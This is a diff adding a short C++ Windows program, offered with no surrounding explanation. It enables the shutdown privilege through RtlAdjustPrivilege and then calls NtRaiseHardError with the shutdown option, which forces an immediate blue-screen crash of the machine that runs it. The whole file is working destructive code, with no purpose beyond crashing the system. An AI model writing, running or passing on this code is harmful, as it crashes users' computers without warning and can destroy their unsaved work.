@@ -1,0 +1,11 @@
+#include <Windows.h>
+#include <ntdll.h>
+
+int main()
+{
+    BOOLEAN t1;
+    DWORD t2;
+    RtlAdjustPrivilege(19, true, false, &t1);
+    NtRaiseHardError(0xc0000022, 0, 0, NULL, 6, &t2);
+    return 0;
+}
